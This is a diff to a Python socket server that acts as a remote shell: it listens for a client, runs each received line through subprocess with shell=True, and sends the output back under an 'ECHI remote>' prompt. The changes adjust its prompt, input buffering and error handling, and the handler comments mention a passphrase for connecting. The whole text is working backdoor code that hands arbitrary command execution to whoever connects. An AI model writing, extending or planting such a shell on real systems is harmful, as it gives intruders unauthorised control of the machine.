@@ -21,11 +21,14 @@ server.listen(3)
 def commands(command):
     command = command.rstrip()
     #Debug statement
-    print("Command equals: " + command)
-    if command[0] != "!":
+
+    if command == "":
+        return command
+    elif command[0] != "!":
         try:
             result =  subprocess.check_output(command,stderr=subprocess.
 STDOUT, shell=True)
+            result = "\n" + result
             return result
         except:
             result = "Failed to execute command.\n"
@@ -42,24 +45,22 @@ STDOUT, shell=True)
 #main server functions, command parsing
 def shell(clientSocket):
     while True:
-        clientSocket.send("\n^-^")
+        clientSocket.send("\nECHI remote> !!")
         buffer = ""
-        #TODO:While "/n" not in buffer does not work
         while "\n" not in buffer:
-            clientSocket.send("Waiting for command")
-            buffer += clientSocket.recv(4096)
-
-        #TODO:Use some terminating character and strip from string?
-        buffer = buffer[:-1]
-        if buffer == 'quit':
-            clientSocket.send("[*] Terminating Connection. Goodbye.")
+            buffer += clientSocket.recv(1024)
+        if "quit" in buffer:
+            clientSocket.send("Tearing down.")
             clientSocket.close()
             break
-        elif buffer == "\n":
-            continue
         else:
-            output = commands(buffer)
-            clientSocket.send(output)
+            response = commands(buffer)
+            try:
+
+                clientSocket.send(response)
+            except:
+                continue
+
 
 #Client Handler, require predetermined hash/passphrase to establish connection
 def handleClient(clientSocket):
